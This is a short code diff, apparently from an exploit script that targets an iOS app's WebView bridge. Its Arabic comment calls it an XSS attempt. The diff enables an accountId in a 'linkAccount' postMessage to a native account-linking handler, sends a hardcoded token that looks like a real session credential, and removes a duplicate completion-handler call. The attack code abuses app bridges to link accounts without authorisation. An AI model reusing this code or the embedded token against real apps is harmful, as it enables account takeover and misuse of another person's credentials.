@@ -41,7 +41,7 @@
       try {
         // نرسل نص فيه كود جافاسكريبت مشفر (XSS محاولة)
         window.webkit.messageHandlers.TargetAccountLinkingInterfaceHandler.postMessage({
-        // accountId: "863776540939551628",
+        accountId: "863776540939551628",
         action: "linkAccount",
         token: "MTQzMTU5NDoxMDU0NjE2NTc1MTQ5Mzc2MTAxOjkyMjMzNzIwMzY4NTQ3NzU4MDc6MXwxNzU0MTAyNzM0OjAtLTQyNDg3YzZjOTgwZTc4MDgzYTk2MDc0MTI5M2Q0ZmVm"
         });
@@ -91,8 +91,6 @@
 
 window.webkit.messageHandlers.pinmarkletCompletionHandler.postMessage(data);
 
-
-window.webkit.messageHandlers.pinmarkletCompletionHandler.postMessage(data);
 
       } catch (e) {
         alert("❌ Error: " + e.message);
